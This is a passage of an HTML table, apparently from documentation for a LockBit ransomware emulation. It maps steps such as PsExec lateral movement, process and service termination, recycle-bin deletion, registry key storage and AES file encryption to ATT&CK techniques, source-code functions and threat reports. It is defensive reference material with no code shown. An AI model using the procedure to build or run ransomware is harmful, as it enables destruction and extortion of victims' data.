<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit affiliate authenticates with <code v-pre>decryptmalfoy\gornuk.da</code> credentials</td>
<td>-</td>
<td>T1078 Valid Accounts</td>
<td>-</td>
</tr>
<tr>
<td>PsExec creates a service</td>
<td>-</td>
<td>T1543.003 Create or Modify System Process: Windows Service</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>PsExec copies LockBit to additional targets</td>
<td>-</td>
<td>T1570 Lateral Tool Transfer</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>PsExec executes LockBit on additional targets</td>
<td>-</td>
<td>T1569.002 System Services: Service Execution</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit enumerates processes to stop via CreateToolhelp32Snapshot, Process32FirstW, and Process32NextW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/proc.cpp#L12-L116">KillProcesses</a></td>
<td>T1057 Process Discovery</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit terminates processes via OpenProcess and TerminateProcess</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/proc.cpp#L12-L116">KillProcesses</a></td>
<td>T1489 Service Stop</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit terminates and disables services via ControlService and ChangeServiceConfigW</td>
<td><a href="../../resources/lockbit/src/lockbit_main/tamper/svc.cpp#L21-L78">TerminateAndDisableServices</a></td>
<td>T1489 Service Stop</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf" class="outbound" target="_blank"><span>Cybereason</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit clears the recycle bin</td>
<td><a href="../../resources/lockbit/src/common/impact/recycling.cpp#L8-L33">ClearRecycleBin</a></td>
<td>T1485 Data Destruction</td>
<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit writes registry keys <code v-pre>HKCR\.&lt;extension&gt;</code> and <code v-pre>HKCR\&lt;extension&gt;\DefaultIcon</code> to customize icons for encrypted files</td>
<td><a href="../../resources/lockbit/src/common/impact/icon.cpp#L36-L84">SetEncryptedFileIcon</a></td>
<td>T1112 Modify Registry</td>
<td><a href="https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit writes RSA public and private session keys to <code v-pre>HKCU\SOFTWARE\BlockBlit</code> via RegCreateKeyExW and RegSetValueExW</td>
<td><a href="../../resources/lockbit/src/common/impact/encryption.cpp#L431-L471">StoreRsaSessionKeys</a></td>
<td>T1112 Modify Registry</td>
<td><a href="https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/" class="outbound" target="_blank"><span>Sophos</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://blog.lexfo.fr/lockbit-malware.html" class="outbound" target="_blank"><span>Loxfo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>RSA private session key is encrypted using RSA</td>
<td><a href="../../resources/lockbit/src/common/crypto/encryption.cpp#L205-L231">EncryptRsaPrivateSessionKey</a></td>
<td>T1027 Obfuscated Files or Information</td>
<td><a href="https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/" class="outbound" target="_blank"><span>Sophos</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://blog.lexfo.fr/lockbit-malware.html" class="outbound" target="_blank"><span>Loxfo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit enumerates target files in main <code v-pre>C:</code> drive using FindFirstFileW and FindNextFileW</td>
<td><a href="../../resources/lockbit/src/common/enumerate.cpp#L67-L117">EnumerateAndEncrypt</a></td>
<td>T1083 File and Directory Discovery</td>
<td><a href="https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://redpiranha.net/news/look-lockbit-3-ransomware" class="outbound" target="_blank"><span>Red Piranha</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>LockBit encrypts target files in main <code v-pre>C:</code> using 256-bit AES</td>
<td><a href="../../resources/lockbit/src/common/impact/encryption.cpp#L333-L395">EncryptFileAndAppendExtension</a></td>
<td>T1486 Data Encrypted for Impact</td>
<td><a href="https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/" class="outbound" target="_blank"><span>Antiy</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a><br><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a" class="outbound" target="_blank"><span>CISA</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g 